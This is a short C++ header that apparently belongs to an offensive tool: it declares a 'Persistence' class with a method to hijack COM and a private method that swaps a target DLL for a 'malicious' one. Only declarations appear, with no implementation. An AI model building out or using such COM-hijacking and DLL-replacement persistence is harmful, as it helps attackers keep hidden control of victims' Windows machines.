#ifndef PERSISTENCE_H
#define PERSISTENCE_H

#include <string>

class Persistence {
public:
    void hijackCOM();
private:
    void replaceDLL(const std::string& target, const std::string& malicious);
};

#endif
